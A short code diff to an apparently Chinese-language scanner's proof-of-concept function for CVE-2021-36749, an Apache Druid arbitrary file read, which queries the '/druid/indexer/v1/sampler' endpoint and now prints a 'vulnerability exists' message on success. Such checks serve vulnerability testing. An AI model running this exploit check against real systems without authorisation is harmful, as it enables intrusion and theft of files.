@@ -57,8 +57,10 @@ lists = [
 
 
 def Apache_Druid_any_path(inurl, timeout=6,code='gbk'):
-    main.print_blue('CVE-2021-36749')
+    poc_name = 'CVE-2021-36749'
     re = ''
+    if inurl[-1] == '/':
+        inurl = inurl[0:len(inurl) - 1]
     for list in lists:
         url = inurl + "/druid/indexer/v1/sampler?for=connect"
         headerss = {"Accept": "application/json, text/plain, */*",
@@ -84,7 +86,8 @@ def Apache_Druid_any_path(inurl, timeout=6,code='gbk'):
         re = re + r.text
         if not 'Error 404 Not Found' in re and not 'Not Found' in re:
             if not '404' in re:
-                return '成功返回：' + re
+                main.print_green(f'{poc_name} ====> 存在漏洞 ====> {url}')
+                return
             else:
                 re = re + '失败'
         else:
